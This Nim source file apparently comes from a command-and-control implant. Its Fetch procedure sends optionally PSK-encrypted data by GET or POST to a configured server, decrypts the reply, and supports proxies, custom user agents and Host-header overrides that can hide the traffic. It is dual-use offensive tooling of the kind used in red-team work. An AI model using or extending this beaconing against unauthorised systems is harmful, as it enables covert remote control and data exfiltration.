import base64
import asyncdispatch
import httpclient
import config
from checkin import getHostName
from task import Job
import json
import uri
import tables
when defined(AESPSK):
    from crypto import encryptStr,decryptStr
    from uri import decodeUrl

import debug

# TODO sort config
proc Fetch*(curConfig: Config, bdata: string, isGet: bool): Future[string] {.async.} = 
    let dataToSend = when defined(AESPSK): encryptStr(curConfig.PayloadUUID, curConfig.Psk, bdata) else: bdata
    var proxySet = false
    var myProxy : Proxy
    debugMsg("Curconfig.ProxyAddress: ", curConfig.ProxyAddress)
    if(len(curConfig.ProxyAddress) > 1):
        myProxy = newProxy(curConfig.ProxyAddress, curConfig.ProxyUser & ":" & curConfig.ProxyPassword)
        proxySet = true
    debugMsg("Creating client, is proxyset?  ", $(proxySet))
    # check if config.hostheader is set and if it is add httpheader check here
    let client = if proxySet: newAsyncHttpClient( if len(curConfig.UserAgent) > 0: curConfig.UserAgent else: defUserAgent, proxy = myProxy) 
                 else: newAsyncHttpClient(if len(curConfig.UserAgent) > 0: curConfig.UserAgent else: defUserAgent)
    if(len(curConfig.HostHeader) > 0):
        client.headers = newHttpHeaders({"Host": curConfig.HostHeader})
    #var temp = curConfig
    #temp.Servers.sort(serverCmp)  
    # TODO SORT
    #curConfig.Servers.sort(serverCmp)
    #curConfig = temp
    try:
        if isGet:
            debugMsg("Attempting to create get url and make request")
            debugMsg("dataToSend: ", dataToSend)
            debugMsg("curConfig: ", $(curConfig))
            debugMsg("get url: ", $(parseUri(curConfig.Servers[0].Domain) / curConfig.GetUrl ? {curConfig.Param: dataToSend}))
            result = await getContent(client, $(parseUri(curConfig.Servers[0].Domain) / curConfig.GetUrl ? {curConfig.Param: dataToSend}))
        else:
            debugMsg("post url: ", $(parseUri(curConfig.Servers[0].Domain) / curConfig.PostUrl), "data: ", dataToSend)
            result = await postContent(client, $(parseUri(curConfig.Servers[0].Domain) / curConfig.PostUrl), dataToSend)
        debugMsg("Just received data back from get or post request: ", result)
        when defined(AESPSK):
            # echo "inside post request just received back: encrypted: ", result
            result = decryptStr(curConfig.PayloadUUID, curConfig.Psk, result)
            # echo "after post request decrypted data: ", result
    except:
        let
            e = getCurrentException()
            msg = getCurrentExceptionMsg()
        debugMsg("An exception has occurred when attempting to do a request: ", repr(e), " with message ", msg)
        result = repr(e)
    finally:
        # Clean up connections
        close(client)

